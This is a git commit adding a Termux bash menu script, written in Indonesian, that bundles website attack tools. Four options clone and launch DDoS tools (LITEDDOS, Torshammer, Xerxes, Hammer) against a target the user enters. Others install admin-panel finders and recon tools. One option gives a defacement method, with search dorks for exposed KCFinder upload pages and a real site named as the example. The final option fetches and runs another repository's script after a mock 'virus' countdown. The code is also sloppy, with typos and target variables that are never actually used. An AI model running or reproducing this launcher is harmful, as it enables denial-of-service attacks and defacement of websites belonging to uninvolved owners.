6a29e18103385d7f772f4ccb091f5041aac9834d
B4J1NG4Nt3rh0rm4t <48720733+B4J1NG4Nt3rh0rm4t@users.noreply.github.com>
2019-04-05 20:31:19 +0700

    Add files via upload

---
+++ B4J1N64N.sh
@@ -0,0 +1,236 @@
+#!/system/xbin/bash
+#Author B4J1ⁿ64ⁿ T³RH0RM⁴T
+#thanks BCA
+
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+
+figlet B4J1N64N T00LS | lolcat
+echo $cyan"Beberapa Tools untuk Ddos DLL"
+echo $green"Daftar Toolsnya=>"
+echo $purple"[1] DDOS Website Dengan LITEDDOS"
+echo $purple"[2] DDOS Website Dengan Torshammer"
+echo $purple"[3] DDOS Website Dengan Xerxes"
+echo $purple"[4] DDOS Website Dengan Hammer"
+echo $purple"[5] Installing RED_HAWK"
+echo $purple"[6] Instslling Admin Finder"
+echo $purple"[7] Installing BUSCA PAINEL"
+echo $purple"[8] Metode Deface KCFinder"
+echo $purple"[9] Installing" $green" B4J1N64Nv5"
+echo $purple"[10] Installing Install di atas aja"
+echo
+echo $green  "╭─+++++++++++>
+[Pilih Nomer   (_)(_)==D~~~~~~>%
+╰─+++++++++++>"
+read -p "root@B4J1ⁿ64ⁿ=•>" F47u2
+         
+if [ $F47u2 = 1 ] || [ $F47u2 = 1 ]
+then
+clear
+echo $green"Installing LITEDDOS..."
+sleep 1
+apt update
+apt install git
+sleep 1
+git clone https://github.com/4L13199/LITEDDOS
+mv LITEDDOS $HOME
+cd $HOME/LITEDDOS
+read -p "MasukanTarget:" target
+python2 LITEDDOS.py target 80 100
+fi
+
+if [ $F47u2 = 2 ] || [ $F47u2 = 2 ]
+then
+clear
+echo $green"Installing Torshammer..."
+sleep 1
+pkg update
+pkg install git
+apt install tor
+pkg install python2
+sleepv1
+git clone https://github.com/dotfighter/torshammer.git
+mv torshammer $HOME
+cd $HOME/torshammer
+read -p "Masukan Target:" target
+python2 torshammer.py -T-t target
+fi
+
+if [ $F4Tu2 = 3 ] || [ $F47u2 = 3 ]
+then
+clear
+echo $green"Installing Xerxes..."
+sleep 1
+apt install git
+apt install clang
+sleep 1
+git clone https://github.com/zanyarjamal/xerxes
+mv xerxes $HOME
+cd $HOME/xerxes
+clang xerxes.c -o xerxes
+clear
+read -p "[masukanWebsiteTarget]>" target
+./xerxes
+fi
+
+if [ $F47u2 = 4 ] || [ $F47u2 = 4 ]
+then
+clear
+echo $green" Installing Hammer.."
+sleep 1
+pkg update
+pkg upgrade
+pkg install python
+pkg install git
+sleep 1
+git clone https://github.com/cyweb/hammer
+mv hammer $HOME
+cd $HOME/hammer
+read -p "Masukan Target:" target
+python2 hammer.py -T-t target
+fi
+
+if [ $F47u2 = 5 ] || [ $F47u2 = 5 ]
+then
+clear
+echo $green" Installing RED_HAWK..."
+sleep 1
+apt update
+apt install php
+apt install git
+sleep 1
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+mv RED_HAWK $HOME
+cd $HOME/RED_HAWK
+chmod +x rhawk.php
+php rhawk.php
+fi
+
+if [ $F47u2 = 6 ] || [ $F47u2 = 6 ]
+then
+clear
+echo $green" Indtalling Admin Finder..."
+sleep 1
+apt update && apt upgrade
+pkg install python2
+sleep 1
+git clone https://github.com/AdheBolo/AdminFinder
+mv AdminFinder $HOME
+cd $HOME/AdminFinder
+chmod 777 AdminFinder.py
+python2 AdminFinder.py
+fi
+
+if [ $F47u2 = 7 ] || [ $F47u2 = 7 ]
+then
+clear
+echo $green" Installing Adminp3naL..."
+sleep 1
+pkg install python2
+pkg install git
+sleep 1
+git clone https://github.com/Techzindia/admin_penal
+mv admin_penal $HOME
+cd $HOME/admin_penal
+chmod +x admin_panel_finder.py
+python2 admin_panel_finder.py
+fi
+
+if [ $F47u2 = 8 ] || [ $F47u2 = 8 ]
+then
+clear
+echo $green"metode Deface KCFinder"
+sleep 1
+clear
+echo $red"Method/metode KCFinder"
+echo
+echo $white"Inurl:/kcfinder/browse.php"
+echo
+echo $green"Inurl:/Kcfinder/"
+echo
+echo $blue"Langsung saja upload file deface anda,"
+echo
+echo $cyan"lalu panggil dengan tambahan /file/namasckamu.html"
+echo
+echo $white"Contoh:https://basukiwater.com/kcfinder/browse.php"
+echo
+echo $green"jadi:https://basukiwater.com/file/namasckamu.html"
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+echo $white"Created" $green"F47u2"
+fi
+
+if [ $F47u2 = 10 ] || [ $F47u2 = 10 ]
+then
+clear
+figlet AWAAAAAAS Installing VIRUS |lolcat
+sleep 3
+echo $green" WE DO NOT FRIEND"
+sleep 3
+figlet WE ARE FAMILY |lolcat
+sleep 3
+echo $red" WE ARE FIGTHER"
+sleep 3
+figlet WE DO NOT GIVE |lolcat
+sleep 3
+echo $red" WE DO NOT FORGET"
+sleep 3
+figlet I NEED YOU CLOSE TO TERMUX !!! |lolcat
+sleep 3 
+echo $white" RIGHT NOWWWWWWW"
+sleep 3
+figlet SO INGGRIS KAMBING -_ W HITUNG DARI |lolcat
+sleep 3
+echo $green"THREE"
+sleep 1
+echo $red"TWOOO"
+sleep 1
+echo $white"ONE"
+sleep 1
+echo $red"WARNING !!!"
+sleep 5
+figlet @#$@#$@#$@#$@$#$@#$@#$@#$@#$@#$@#$@#@$#@$#$@#$@#$@#$@#$@#$@#$#%#$#%#$@%#$
+#$@#$@$#$@#$@#$@$#@$#$@$#$@%#$@$#%#%#%#%#%#%$%@#$@%#$@%#$@%#$###%#$#%@$#%#%#%#%%
+$#%@$#%@$#%@$#%@$#%#$#%@$#$@%#$#%#%#@$#@$#$@%#%#$#%#%#%#%#%##@@#@#$#%##%###%####
+%#$@%#$@%##$@$@%#$#%#$#%#$#%#$#%#%#$#%#$@%#$@%#$@%@$@%#$#%#$@%#%#$#%#%#%#$#%@%#%
+!@$!#@$!#@$!#@$!#!$@#!#!$!#!$!#!#!$!#!#!!@$!#@$!#@$!#@$@$!@@%!$@$!#!%@$!%@$!$@%@
+%@$!#@%@$!#!%@$!#@%!$!$@$!#@%@$!%@@%@$!$!%@$!%@$@$@%@$!$@$@$!%@$@$@$@%@$!$@$@$@$
+!$@!%@#!%@%@%@%#$@%#$!$@%#%!$@%!$@%@$!%@$!%#!%@%!$@%@$!%@$!%@$!%@$!%@$@$@$@$@%@$ | lolcat
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! | lolcat
+sleep 1
+figlet SELAMAT|lolcat
+sleep 1
+pkg install update
+pkg install git
+pkg install toilet
+pkg install figlet
+pip2 install lolcat
+sleep 1
+git clone https://github.com/DarknessCyberTeam/B4J1N64Nv5
+mv B4J1N64Nv5 $HOME
+cd $HOME/B4J1N64Nv5
+sh B4J1N64N.sh
+fi
+
+
+
+
